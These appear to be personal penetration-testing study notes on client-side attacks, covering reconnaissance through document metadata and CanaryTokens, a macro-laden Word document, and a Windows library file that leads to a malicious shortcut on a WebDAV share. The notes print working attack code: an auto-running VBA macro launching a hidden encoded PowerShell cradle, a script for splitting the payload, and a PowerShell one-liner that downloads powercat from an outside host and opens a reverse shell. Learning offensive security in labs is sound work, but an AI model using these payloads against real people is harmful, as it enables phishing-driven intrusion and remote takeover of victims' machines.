>[!info]- Info - What are client-side attacks?
>A client-side attacks include malicious email attachments or links to malicious websites/files. They're tasked with getting a foothold within a network via a machine on the inside, rather than via machine that's on the perimeter.
## Reconnaissance
#### Publicly Available Documents

>[!exploit]- Exploit - The metadata in those documents may contain valuable information

>[!code]- Search for documents
>Google search for PDFs:
>```
>site:example.com filetype:pdf
>```

>[!code]- Examine a documents metadata
>- **-a** to display duplicated tags
>- **-u** to display unknown tags
>```bash
>kali@kali:~/Downloads$ exiftool -a -u brochure.pdf
>```

>[!success]- The metadata suggests the company uses Microsoft Office
#### Fingerprinting

>[!exploit]- Exploit - Generate a link that when opened sends information about that machine

>[!code]- Generate a malicious link with CanaryTokens
>- Go to the CanaryTokens [website](https://canarytokens.org/generate)
>- Select _Web bug / URL_ from the dropdown menu
>- `https://example.com` as the webhook URL
>- Enter **Fingerprinting** as the comment
>- Click _Create my Canarytoken_

>[!code]- (Optional) Embed the link into a document
>Rather than selecting _web bug / URL token_ when creating the token, we could have selected _Microsoft Word Document_ or _Microsoft Excel Document_.
## Attacks
### Exploiting Microsoft Office

>[!Exploit]- Exploit - A user executes the embedded macros in a MS document
>- MS documents downloaded from the web are tagged with the _Mark of the Web_ (MOTW)
>- Documents tagged with MOTW will open in _Protected View_, which disabled all editing, modifications settings and blocks the execution of macros or embedded objects
>- When the victim opens the document and enables editing, the protect view is disabled, which would allow any embedded malicious code to be executed

>[!warning]- Limitation - A Microsoft update complicated the process to enabling macros
>The change meant that macro-enabled documents need to have macros unblocked from within the file properties, rather than simply clicking _Enable Content_.

>[!code]- Install Microsoft Office

>[!code]- Create the malicious MS Word document
>Create and save a new file in the **.doc** format (**.docx** cannot have macros embedded into it, but rather it must be within an attached containing template)
>___
>Go to _View_ > _Macros_
>___
>Create a new macro, having named the macro and selecting the document to associate it with
>![[Pasted image 20240524053110.png]]
>___
>Create the malicious macro.
>- Use a Windows Script Host Shell object to start a PowerShell window
>- Ensure the subroutine _MyMacro_ is started when any of the various ways a MS document can be opened is commenced (covered by the subroutines _AutoOpen()_ and _Document_Open()_).
>- `Dim Str as String` - add a base64 encoded string ([[OSCP Flow#^cb742d|see this encoded download cradle]]) which downloads PowerCat and starts a reverse shell. The encoded string needs to be broken and stored in several variables due to the 255-character limit for literal strings in VBA
>	- Use a Python script (see below) to split the encoded string
>
>```vba
>Sub AutoOpen()
>	MyMacro
>End Sub
>
>Sub Document_Open()
>	MyMacro
>End Sub
>
>Sub MyMacro()  
>	Dim Str As String
>
>	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"  
>	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
>	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
>	...
>	Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
>	Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
>	Str = Str + "A== "
>
>	CreateObject("Wscript.Shell").Run Str
>End Sub
>```
>Python script (which takes the base64 encoded download cradle):
>```python
>str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
>
>n = 50
>
>for i in range(0, len(str), n):  
>	print("Str = Str + " + '"' + str[i:i+n] + '"')
>```

>[!code]- Setup a listener and put the MS Word document on the victim machine
>Then wait for the victim the open it and enable macros and catch the reverse shell.
### Windows Library Files

>[!info]- Info - What are Windows library files?
>They are virtual containers for user content. They connect user with data stored in remote locations, like web services or shares. They have a **.Library-ms** file extension.

>[!exploit]- Exploit - Send WLF > opens WedDAV share > contains malicious .lnk file
>1. The user receives a **.Library-ms** file, perhaps via email
>2. They double click the WLF file which connects them to our WebDAV share. Opening the WLF file appears as a regularly directory in Windows Explorer.
>3. Within the WebDAV share is a **.lnk** shortcut file; when clicked it executes a PowerShell reverse shell

>[!exploit]- The WebDAV share that hosts the .lnk file bypasses spam filters that other sharing means wouldn't

>[!code]- Setup a WebDAV share on Kali
>Install WsgiDAV:
>(_If the installation of WsgiDAV fails with error: externally-managed-environment, you can add **â€“break-system-packages**_):
>```bash
>kali@kali:~$ pip3 install wsgidav
>```
>___
>Run WsgiDAV:
>- **--host** specifies the host to serve from (**0.0.0.0** ie all interfaces)
>- **--port 80** specifies the listening port
>- **--auth=anonymous** to disable authentication to the share
>```bash
>kali@kali:~$ mkdir /home/kali/webdav
>kali@kali:~$ touch /home/kali/webdav/test.txt
>kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous - -root /home/kali/webdav/
>```
>___
>Visit 127.0.0.1 to confirm the WebDAV server is running, on port 80.

>[!code]- Create the Windows library file
>Open Visual Studio Code (or Notepad)
>___
>```xml
><?xml version="1.0" encoding="UTF-8"?>  
><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"><name>@windows.storage.dll,-34582</name>  
<version>6</version>  
<isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1003</iconReference>  
<templateInfo>  
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo>  
<searchConnectorDescriptionList>  
<searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported>  
<simpleLocation>  
<url>http://192.168.119.2</url>  
</simpleLocation>  
</searchConnectorDescription>  
</searchConnectorDescriptionList>  
</libraryDescription>

>[!code]- Create the shortcut (.lnk) file & copy it to the WebDAV share
>Right click _Desktop > New > Shortcut_ and enter a path for the a PowerShell command.
>```powershell
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
>```
>![[Pasted image 20240528050531.png]]

>[!code]- On Kali start a python web server and wait for victim
>```bash
>kali@kali:~$ nc -nvlp 4444
>```

>[!code]- Transfer the WLF to victim and have them execute it
